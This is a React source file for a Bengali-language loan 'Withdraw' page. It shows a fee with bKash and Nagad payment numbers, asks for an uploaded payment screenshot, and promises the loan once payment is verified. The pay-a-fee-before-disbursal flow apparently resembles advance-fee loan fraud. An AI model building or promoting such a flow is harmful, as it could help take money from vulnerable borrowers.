import axios from "axios";
import React, { useEffect, useState } from "react";
import toast from "react-hot-toast";
import { useParams } from "react-router-dom";

const Withdraw = () => {
    const { email } = useParams();

    const base_url = import.meta.env.VITE_BASE_URL;
    const imgbb_key = import.meta.env.VITE_IMGBB_API_KEY;

    const [userFromDb, setUserFromDb] = useState({});
    const [dbLoading, setDbLoading] = useState(false);

    const [showMassage, setShowMassage] = useState(false);
    const [showMassageData, setShowMassageData] = useState({});

    const [imgUrl, setImgUrl] = useState("");
    const [imgUploading, setImgUploading] = useState(false);
    const [allMassages, setAllMassages] = useState([])

    /* ================= LOAD USER DATA ================= */
    const loadData = async () => {
        try {
            setDbLoading(true);

            const res = await axios.get(`${base_url}/user/${email}`);
            setUserFromDb(res.data);

            if (res?.data?.massages?.length > 0) {
                setAllMassages(res?.data?.massages)
                const index = res.data.massages.length - 1;
                setShowMassageData(res.data.massages[index]);
            }

            if (res?.data?.showMassae) {
                setShowMassage(true);
            }
        } catch (error) {
            console.error("Load error:", error);
        } finally {
            setDbLoading(false);
        }
    };

    useEffect(() => {
        loadData();
    }, [email]);

    /* ================= IMAGE UPLOAD ================= */
    const handleImageUpload = async (e) => {
        const file = e.target.files[0];
        if (!file) return;

        try {
            setImgUploading(true);

            const formData = new FormData();
            formData.append("image", file);

            const res = await axios.post(
                `https://api.imgbb.com/1/upload?key=${imgbb_key}`,
                formData
            );

            setImgUrl(res.data.data.url);
        } catch (error) {
            console.error("Image upload failed:", error);
        } finally {
            setImgUploading(false);
        }
    };

    /* ================= SUBMIT ================= */
    const handleSubmit = async (e) => {
        e.preventDefault();
        toast.loading("অপেক্ষা করুন");

        if (!imgUrl) {
            alert("Please upload payment screenshot");
            return;
        }

        const payload = {
            image: imgUrl,
            name: showMassageData?.selectedFinalMassage?.name,
            amount: showMassageData?.amount,
            createdAt: new Date(),
        };

        console.log("SUBMIT DATA 👉", payload);
        const res = await axios.patch(`${base_url}/users/documents/${email}`, payload);
        if (res.data) {
            toast.dismiss();
            toast.success("ডকুমেন্ট সফলভাবে যুক্ত করা হয়েছে");
            window.location.reload();
            setImgUrl("");
        }
        else {
            toast.dismiss();
            toast.error("ডকুমেন্ট যুক্ত করা যায়নি");
        }


    };

    if (dbLoading) {
        return (
            <div className="min-h-screen flex justify-center items-center">
                <p className="text-lg font-medium">Loading...</p>
            </div>
        );
    }

    return (
        <div className="w-full bg-gray-50 min-h-screen">
            <div className="w-11/12 mx-auto">

                {
                    !showMassage && <div className="">

                        {
                            allMassages.length === 1 ? <div className="p-4 mt-4 shadow bg-yellow-100 rounded-lg">
                                ওয়েট করেন কাজ চলিতেছে লোন পেতে বিলম্ব হলে যোগাযোগ করুন
                            </div>
                                :
                                <p className="p-4 mt-4 shadow bg-yellow-100 rounded-lg">
                                    আপনার আবেদন সম্পূর্ণ হয়েছে, অনুগ্রহ করে কিছু সময় অপেক্ষা করুন। আপনার পেমেন্ট তথ্য যাচাই করার পরে আপনার ঋণ টি আপনার একাউন্টে পাঠানো হবে। যদি টাকা পেতে সমস্যা হয় তবে হেল্পলাইনে যোগাযোগ করুন।

                                </p>
                        }


                    </div>
                }

                {/* ================= HEADER ================= */}
                {showMassage && (
                    <div className="w-full bg-blue-600 text-white rounded-xl p-6 mt-6 shadow">
                        <h2 className="text-center text-3xl font-semibold">
                            Payment Details
                        </h2>
                        <p className="text-center text-blue-100 mt-1">
                            Complete your payment to proceed
                        </p>
                    </div>
                )}

                {showMassage && (
                    <div className="grid md:grid-cols-2 gap-6 mt-6">

                        {/* ================= LEFT ================= */}
                        <div className="bg-yellow-50 rounded-xl shadow p-6">
                            <p className="text-lg font-medium text-gray-800">
                                {showMassageData?.selectedFinalMassage?.title}
                            </p>

                            <div className="bg-rose-200 text-center rounded-xl p-4 mt-4 shadow">
                                <p className="text-sm text-gray-600">
                                    ফি এর পরিমাণ
                                </p>
                                <p className="text-3xl font-bold text-gray-800">
                                    ৳ {showMassageData?.amount}
                                </p>
                            </div>

                            <div className="grid grid-cols-2 gap-4 mt-6">
                                <div className="bg-rose-500 text-white rounded-xl p-4 text-center">
                                    <h1 className="text-xl font-semibold">
                                        বিকাশ
                                    </h1>
                                    <p className="text-lg mt-1">
                                        {showMassageData?.selectedFinalMassage?.bkashNumber}
                                    </p>
                                </div>

                                <div className="bg-orange-500 text-white rounded-xl p-4 text-center">
                                    <h1 className="text-xl font-semibold">
                                        নগদ
                                    </h1>
                                    <p className="text-lg mt-1">
                                        {showMassageData?.selectedFinalMassage?.nagadNumber}

                                    </p>
                                </div>
                            </div>
                        </div>

                        {/* ================= RIGHT ================= */}
                        <div className="bg-emerald-50 rounded-2xl shadow-md p-6">
                            <p className="text-base font-semibold text-gray-800">
                                প্রমাণ সংযুক্ত করুন
                                <span className="text-sm text-gray-500 ml-1">
                                    (Screenshot)
                                </span>
                            </p>

                            <form
                                onSubmit={handleSubmit}
                                className="mt-5 flex flex-col gap-5"
                            >
                                <label className="w-full h-40 border-2 border-dashed border-rose-400 
                                    rounded-xl bg-white flex flex-col justify-center items-center 
                                    cursor-pointer hover:border-rose-500 transition">

                                    {imgUrl ? (
                                        <img
                                            src={imgUrl}
                                            alt="preview"
                                            className="h-full object-contain rounded-xl"
                                        />
                                    ) : (
                                        <>
                                            <p className="text-sm text-gray-600">
                                                স্ক্রিনশট আপলোড করুন
                                            </p>
                                            <p className="text-xs text-gray-400">
                                                PNG / JPG
                                            </p>
                                        </>
                                    )}

                                    <input
                                        type="file"
                                        accept="image/*"
                                        className="hidden"
                                        onChange={handleImageUpload}
                                    />
                                </label>

                                <button
                                    type="submit"
                                    disabled={imgUploading}
                                    className="w-full py-3 rounded-xl bg-rose-500 
                                        hover:bg-rose-600 text-white font-medium transition disabled:opacity-60"
                                >
                                    {imgUploading ? "Uploading..." : "জমা দিন"}
                                </button>
                            </form>
                        </div>

                    </div>
                )}
            </div>
        </div>
    );
};

export default Withdraw;
